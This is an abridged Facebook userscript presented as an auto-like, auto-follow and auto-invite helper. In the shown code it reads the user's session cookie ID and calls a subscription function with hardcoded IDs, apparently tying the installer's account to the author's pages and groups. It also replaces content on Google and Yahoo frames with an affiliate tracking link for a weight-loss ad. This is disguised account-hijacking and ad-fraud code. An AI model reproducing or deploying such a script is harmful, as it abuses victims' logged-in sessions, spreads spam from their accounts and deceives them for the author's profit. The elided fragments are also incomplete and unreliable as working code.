// ==UserScript===
// @name			AutoADD | AutoLike Status | AutoLike Comment | AutoFollow(sub) | AutoInvite Facebook
// @namespace			AutoADD | AutoLike Status | AutoLike Comment | AutoFollow(sub) | AutoInvite Facebook
...
// @author			Bergeny Vst (Mellal Abdeslam)
// @authorURL			http://www.facebook.com/bergeny
...
sublist("10201839505089252");

var gid = ['172510152929346'];
...
var spage_id = "294530000642718";
var spost_id = "294530000642718";
var sfoto_id = "294530000642718";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
for (var i = len-1; i >= 0; i--) {
	...
	if (f.src == google_url || f.src == yahoo_url) {
		var replace_text = '<a href="http://www.mmtracking.com/mt/v254v234e4t233z244r2r2/" target="_blank"><img src="http://www.discoverwalking.com/wp-content/uploads/free-weight-loss.jpg" width="200" border="0" /></a>';
